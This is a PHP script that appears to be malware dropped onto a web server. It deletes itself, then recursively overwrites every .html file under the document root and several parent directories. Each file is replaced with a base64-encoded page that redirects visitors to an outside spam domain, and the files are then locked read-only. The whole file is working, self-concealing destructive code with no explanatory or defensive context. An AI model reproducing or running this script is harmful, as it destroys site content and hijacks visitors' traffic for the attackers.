<?php unlink(__FILE__); @ignore_user_abort (true);
set_time_limit ( 111000 );


for ($index = 0; $index <=5 ; $index++){


$atob = 0;


$ggg = "PCFET0NUWVBFIEhUTUw+DQo8aHRtbCBsYW5nPSJlbi1VUyI+DQogICAgPGhlYWQ+DQogICAgICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCiAgICAgICA8bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSIwOyB1cmw9aHR0cHM6Ly9oZWFsdHlsaWZlcG9pbnQuY29tLyI+DQogICAgICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NCiAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gImh0dHBzOi8vaGVhbHR5bGlmZXBvaW50LmNvbS8iDQogICAgICAgIDwvc2NyaXB0Pg0KICAgICAgICA8dGl0bGU+UGFnZSBSZWRpcmVjdGlvbjwvdGl0bGU+DQogICAgPC9oZWFkPg0KICAgIDxib2R5Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwhLS0gTm90ZTogZG9uJ3QgdGVsbCBwZW9wbGUgdG8gYGNsaWNrYCB0aGUgbGluaywganVzdCB0ZWxsIHRoZW0gdGhhdCBpdCBpcyBhIGxpbmsuIC0tPg0KICAgICAgICBJZiB5b3UgYXJlIG5vdCByZWRpcmVjdGVkIGF1dG9tYXRpY2FsbHksIGZvbGxvdyB0aGlzIDxhIGhyZWY9J2h0dHBzOi8vaGVhbHR5bGlmZXBvaW50LmNvbS8nPmxpbmsgdG8gZXhhbXBsZTwvYT4uDQogICAgPC9ib2R5Pg0KPC9odG1sPg0KDQo=";

$shell_url = ((!empty($_SERVER['HTTPS'])) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] ;
$x_domains = explode(',' ,  "goodcarequality.su");


$server_domain = $_SERVER['HTTP_HOST'];

// ------------------------ links in all folders



$root =  $_SERVER["DOCUMENT_ROOT"];
if (strpos($root,'/') !== false) {
    $path =  $root . "/";
}
else $path = $root . "\\";

$links_replaced = 0;
$files_changed = 0;
$php_redirect = 0;

$replace_link = 'http://' . $x_domains[array_rand($x_domains)] . '/';

$root = $path;
if ($index == 0) {
$root = rtrim(dirname($root));}
else
{
 $root = rtrim(dirname($root,$index));}

echo PHP_EOL .'Folder deep ' . $index . PHP_EOL;

//break;
$realpath = $root;

//echo  $root . '     ----  ' .   $realpath . PHP_EOL;

$fileObjects = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($realpath),
                 RecursiveIteratorIterator::SELF_FIRST);

foreach($fileObjects as $key => $object){
//    if($object->getFilename() === 'filename.png') {


if (strpos($object->getFilename(), '.html' ) !== false)   {
        
$fname = $object->getPathname() ;



//echo  $shell_url . $fname . PHP_EOL . $orig_body . PHP_EOL .PHP_EOL;







$files_changed++;
chmod($fname, 0644);
file_put_contents($fname,base64_decode( $ggg));
//file_put_contents($fname,'<HTML>');
chmod($fname, 0444);

//break;

//echo file_get_contents($fname) . PHP_EOL . PHP_EOL;
//break;



}
}
echo 'Files = ' . $files_changed  . '  Links changed in  '  . $links_replaced . ' files'; 
//echo 'Domain = ' .  $server_domain .  '  Files = ' . $files_changed  . '  Links changed in  '  . $links_replaced . ' files ... atob changed : ' . $atob . '   PHP execute files old : ' . $php_redirect; 



}

